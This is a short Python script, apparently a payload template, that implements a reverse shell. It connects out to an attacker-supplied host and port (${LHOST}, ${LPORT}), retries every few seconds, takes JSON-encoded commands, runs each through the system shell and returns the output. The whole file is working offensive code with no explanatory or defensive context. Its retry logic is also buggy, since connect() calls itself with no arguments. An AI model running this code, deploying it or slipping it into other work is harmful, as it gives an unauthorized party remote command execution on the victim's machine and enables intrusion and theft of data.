import socket
import time
import json
import subprocess

def send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

    
def recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError: 
            continue


def connect(ip: str, port: int): 
    while True:
        time.sleep(3)
        try:
            s.connect((ip, port))
            shell()
            s.close()
            break
        except:
            connect()

def shell():
    while True:
        command = recv()
        if command == 'exit':
            break
        else:
            execute = subprocess.Popen(command, 
                                       shell=True, 
                                       stdin=subprocess.PIPE, 
                                       stdout=subprocess.PIPE, 
                                       stderr=subprocess.PIPE)
            send((execute.stdout.read() + execute.stderr.read()).decode())


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect(${LHOST}, ${LPORT})